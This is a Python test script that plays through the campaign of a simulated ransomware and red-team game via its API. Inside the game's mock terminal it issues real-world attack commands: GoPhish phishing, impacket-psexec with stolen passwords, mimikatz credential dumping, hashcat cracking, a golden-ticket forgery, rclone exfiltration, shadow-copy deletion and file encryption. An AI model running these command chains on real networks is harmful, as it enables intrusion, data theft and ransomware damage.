"""Parcours reproductibles de la campagne via les mêmes endpoints que le client.

Les ticks sont avancés sans attendre pour les tests. Ni actions directes, ni
injection d'identifiants : tout résultat de mission passe par une commande.
"""
from __future__ import annotations
import asyncio
import copy
import json
import shlex
import tempfile
from pathlib import Path
import httpx
from engine.career import Career
from engine.persistence import state_from_dict, state_to_dict
from engine.game_loop import GameLoop
from api import main as api

REFERENCE_SEEDS = {'tuto_p0':0,'morel':0,'rival':1,'varenne':2,'affiliation':2,'grand_compte':0}
CONTRACT_IDS = ['tuto_p0', 'morel', 'rival', 'varenne', 'affiliation', 'grand_compte']


async def play_campaign(output: Path | None = None, *, variant: str = 'standard', replays: list | None = None, seeds: dict | None = None, existing: Career | None = None, contract_ids: list[str] | None = None, affiliation: str = 'vesper') -> dict:
    if affiliation not in {'vesper', 'glasswing'}: raise ValueError('Mode d’affiliation inconnu.')
    report = {'scope': 'API et terminal simulé ; ticks accélérés ; aucune validation manuelle GPU', 'variant': variant, 'scenarios': []}
    previous = (api._CAREER, api._WORKSPACE, api.GAMES.copy())
    with tempfile.TemporaryDirectory(prefix='redteam-validation-') as folder:
        api._CAREER = existing or Career(Path(folder) / 'career.json')
        api._WORKSPACE = None
        api.GAMES.clear()
        try:
            async with httpx.AsyncClient(transport=httpx.ASGITransport(app=api.app), base_url='http://test') as client:
                async def purchase(item):
                    if item in api.career().data['inventory']: return
                    response=await client.post('/api/shop/buy',json={'item':item})
                    assert response.status_code==200,(item,response.text)
                    if not response.json()['paid']:
                        nonce=response.json()['wallet']['pending']['id']
                        for action in ('connect','unlock'):
                            assert (await client.post('/api/wallet/device',json={'action':action})).status_code==200
                        paid=await client.post('/api/wallet/device',json={'action':'approve','request_id':nonce})
                        assert paid.status_code==200,paid.text

                for cid in contract_ids or CONTRACT_IDS:
                    career = api.career()
                    if cid == 'varenne':
                        await purchase('nullvad')
                        assert (await client.post('/api/profile/route',json={'route':'tor'})).status_code==200
                    if cid == 'affiliation': await purchase(affiliation)
                    if cid == 'grand_compte':
                        await purchase('relay')
                        assert (await client.post('/api/profile/route',json={'route':'relay'})).status_code==200
                    response = await client.post('/api/games', json={'contract': cid, 'handle': career.data.get('handle') or 'Operator', 'rng_seed': (seeds or REFERENCE_SEEDS)[cid]})
                    assert response.status_code == 200, (cid, response.text)
                    gid = response.json()['id']
                    replay = {'contract_id': cid, 'variant': variant, 'initial': response.json()['state'], 'steps': []}
                    if replays is not None: replays.append(replay)
                    run = {'id': cid, 'rng_seed': (seeds or REFERENCE_SEEDS)[cid], 'organization': api.GAMES[gid].state.environment.get('organization'), 'checks': [], 'resumes': 0}

                    async def command(line, console='main', *, fail=False, resolve=True):
                        console = {'mail':'term-2','access':'term-3','deploy':'term-4','encrypt-first':'term-5','server':'term-6','downloads':'term-7'}.get(console,console)
                        before_state = (await client.get(f'/api/games/{gid}')).json() if replays is not None else None
                        response = await client.post(f'/api/games/{gid}/terminal', json={'line': line, 'console_id': console})
                        assert response.status_code == 200, (cid, line, response.text)
                        result = response.json()
                        assert result['ok'] != fail, (cid, line, result)
                        if resolve:
                            loop = api.GAMES[gid].loop
                            while loop._queue and loop.state.status == 'RUNNING': loop.tick()
                            if result['queued'] and not fail:
                                assert loop.state.history[-1].success, (cid, line, loop.state.history[-1])
                        if replays is not None:
                            public_state = (await client.get(f'/api/games/{gid}')).json()
                            replay['steps'].append({'line': line, 'console_id': console, 'response': result, 'state': public_state, 'before_state': before_state})
                        return result

                    def state(): return api.GAMES[gid].state

                    async def upload(tool, host, credential, via='smb'):
                        if via == 'scp':
                            await command(f'scp ~/tools/{tool}.exe {credential.username}@{host.ip}:C:/Tools/{tool}.exe', 'deploy')
                            await command(credential.value, 'deploy')
                        else:
                            args = ['smbclient', f'//{host.ip}/C$', '-U', credential.username + '%' + credential.value]
                            if credential.type == 'NTLM_HASH': args.append('--pw-nt-hash')
                            args += ['-c', f'put /home/operator/tools/{tool}.exe Tools/{tool}.exe']
                            await command(shlex.join(args), 'deploy')

                    async def resume():
                        nonlocal gid
                        old = state_to_dict(state())
                        api.career().checkpoint(state())
                        api.GAMES.pop(gid)
                        restored = (await client.post('/api/profile/resume', json={})).json()
                        gid = restored['id']
                        assert state_to_dict(state()) == old
                        run['resumes'] += 1
                        replay['resumed'] = restored['state']

                    primary = state().hosts['poste-accueil'].primary_user
                    admin = state().hosts['poste-accueil'].cached_logons[0]
                    initial = state().hosts['poste-accueil'].ip
                    server_ip = state().hosts['srv-fichiers'].ip
                    subnet = initial.rsplit('.', 1)[0] + '.0/24'
                    if state().terminal_host: await command('exit')
                    result = await command('cat ~/mission/briefing.txt')
                    assert run['organization'] in '\n'.join(result['output'])
                    run['checks'].append('briefing propre à l’entreprise')
                    await command('nmap --invented ' + initial, fail=True)
                    await command('nmap -sV ' + subnet, resolve=False)
                    await resume()  # Action en attente, avant découverte.
                    while api.GAMES[gid].loop._queue: api.GAMES[gid].loop.tick()
                    run['checks'].append('scan, erreur de syntaxe et reprise d’une action en attente')
                    if cid != 'grand_compte':
                        # Le service est un processus réel du monde de jeu, isolé de la console de travail.
                        if not state().tool_services.get('gophish', {}).get('running'):
                            await command('gophish --config /opt/gophish/config.json', 'mail')
                        await command('curl -k -H "Authorization: wrong" https://127.0.0.1:3333/api/groups/')
                        await command('API_KEY=$(cat ~/gophish/api-key.txt)')
                        result = await command('curl -k -H "Authorization: $API_KEY" https://127.0.0.1:3333/api/groups/')
                        groups = json.loads(result['output'][0]); assert groups[0]['targets']
                        await command('curl -k -H "Authorization: $API_KEY" -H "Content-Type: application/json" -d @/home/operator/gophish/campaign.json https://127.0.0.1:3333/api/campaigns/', resolve=False)
                        assert not state().find_credential(primary, 'PLAINTEXT')
                        await resume()  # Serveur, variables, campagne et délai humain restaurés.
                        while api.GAMES[gid].loop._queue: api.GAMES[gid].loop.tick()
                        assert state().find_credential(primary, 'PLAINTEXT'), (cid, 'human_response', state().history[-1].reason)
                        assert state().hosts['poste-accueil'].status == 'HEALTHY'
                        run['checks'].append('GoPhish et curl, authentification API, délai, reprise et absence de session automatique')
                        credential = state().find_credential(primary, 'PLAINTEXT')
                        await command(f'impacket-psexec {primary}:wrong@{initial}', fail=True)
                        await command(f'impacket-psexec {primary}:{credential.value}@{initial}', 'access')
                        assert (await command('whoami', 'access'))['output'] == ['nt authority\\system']
                        await command('uname -a', 'access', fail=True)
                        await command('dir C:\\Data', 'access')
                        await command('mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit', 'access', fail=True)
                        await upload('mimikatz', state().hosts['poste-accueil'], credential, 'scp' if variant == 'alternative' else 'smb')
                        if variant == 'alternative': await command('powershell -NoLogo -NoProfile', 'access')
                        await command('C:\\Tools\\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit', 'access')
                        run['checks'].append('outil absent refusé puis transféré ; session PowerShell' if variant == 'alternative' else 'outil absent refusé puis transféré par SMB')
                        run['checks'].append('droits, mauvais mot de passe, session Windows et extraction en contexte SYSTEM')
                    credential = state().find_credential(admin)
                    assert credential
                    await resume()  # Butin et sessions Windows.
                    if cid in {'morel', 'rival'}:
                        await command(f'hashcat -m 1000 ~/loot/{admin}.ntlm /usr/share/wordlists/rockyou.txt')
                        run['checks'].append('traitement hors ligne du hash, fichier de butin et objectif vérifié')
                        credential = state().find_credential(admin, 'PLAINTEXT')
                    if cid == 'varenne':
                        await command(f'impacket-secretsdump -just-dc -hashes :{credential.value} {admin}@{server_ip}')
                        lookup = await command(f'impacket-lookupsid -domain-sids -hashes :{credential.value} {admin}@{server_ip}')
                        assert state().domain['sid'] in '\n'.join(lookup['output'])
                        secret = state().find_credential('krbtgt', 'KRBTGT_HASH')
                        domain = state().domain
                        await command(f"impacket-ticketer -nthash {secret.value} -domain-sid {domain['sid']} -domain {domain['name']} administrator")
                        assert not state().domain_compromised
                        await command('export KRB5CCNAME=/home/operator/administrator.ccache')
                        await resume()
                        await command(f"impacket-psexec -k -no-pass {domain['name']}/administrator@{state().hosts['srv-fichiers'].hostname}")
                        run['checks'].append('ticket hors ligne, cache sauvegardé et authentification ultérieure obligatoire')
                    elif cid != 'rival':
                        auth = f'{admin}:{credential.value}' if credential.type == 'PLAINTEXT' else f'-hashes :{credential.value} {admin}'
                        if cid in {'affiliation', 'grand_compte'}:
                            # Préparer les deux cibles avant les actions bruyantes et la révocation éventuelle.
                            first_credential = state().find_credential(primary, 'PLAINTEXT') if primary else credential
                            await upload(affiliation, state().hosts['poste-accueil'], first_credential)
                            await upload(affiliation, state().hosts['srv-fichiers'], credential)
                            if cid == 'grand_compte':
                                await command(f'impacket-psexec {admin}:{credential.value}@{initial}', 'encrypt-first')
                            else:
                                await command(f'impacket-psexec {primary}:{first_credential.value}@{initial}', 'encrypt-first')
                            if variant == 'alternative': await command('powershell', 'encrypt-first')
                            await command(affiliation+' encrypt', 'encrypt-first')
                        await command(f'impacket-psexec {auth}@{server_ip}', 'server')
                        if cid in {'morel', 'grand_compte'}:
                            if variant == 'alternative':
                                args = ['smbclient', f'//{server_ip}/C$', '-U', credential.username + '%' + credential.value]
                                if credential.type == 'NTLM_HASH': args.append('--pw-nt-hash')
                                for filename in (['contrats_2026.xlsx','archive.zip'] if cid == 'grand_compte' else ['contrats_2026.xlsx']):
                                    await command(shlex.join(args + ['-c', f'get Data/{filename} /home/operator/loot/{filename}']), 'downloads')
                            else:
                                await upload('rclone', state().hosts['srv-fichiers'], credential)
                                await command('rclone copy C:\\Data remote:loot', 'server')
                            run['checks'].append('transfert de fichiers observé dans l’objectif')
                        if cid == 'grand_compte': await command('vssadmin delete shadows /all /quiet', 'server')
                        if cid in {'affiliation', 'grand_compte'}:
                            if variant == 'alternative': await command('powershell', 'server')
                            await command(affiliation+' encrypt', 'server')
                            run['checks'].append('seuil de chiffrement, affiliation et conséquences sur le règlement')
                    assert state().contract_outcome == 'SUCCESS', (cid, state().end_reason, state().trace, [(h.id,h.status) for h in state().hosts.values()], state().exfiltrated, state().objectives)
                    career.settle(gid, state())
                    money = career.data['money']
                    career.settle(gid, state())
                    assert career.data['money'] == money
                    public = (await client.get(f'/api/games/{gid}')).json()
                    assert public.get('debrief') and public['contract']['payout'] == state().payout
                    replay['success'] = public
                    replay['profile'] = career.view()
                    replay['contracts'] = (await client.get('/api/contracts')).json()
                    run.update(status='passed', tick=state().tick, payout=state().payout)
                    run['checks'].append('débriefing, objectifs et paiement unique')
                    report['scenarios'].append(run)
                    # Recharger réellement le profil entre les contrats.
                    api._CAREER = Career(career.path)
                report['completed'] = api.career().data['completed']
                report['tier'] = api.career().data['tier']
        finally:
            api._CAREER, api._WORKSPACE = previous[:2]
            api.GAMES.clear(); api.GAMES.update(previous[2])
    if output:
        output.parent.mkdir(parents=True, exist_ok=True)
        output.write_text(json.dumps(report, ensure_ascii=False, indent=2) + '\n')
    return report


if __name__ == '__main__':
    import sys
    result = asyncio.run(play_campaign(Path(sys.argv[1]) if len(sys.argv) > 1 else None))
    print(json.dumps(result, ensure_ascii=False, indent=2))
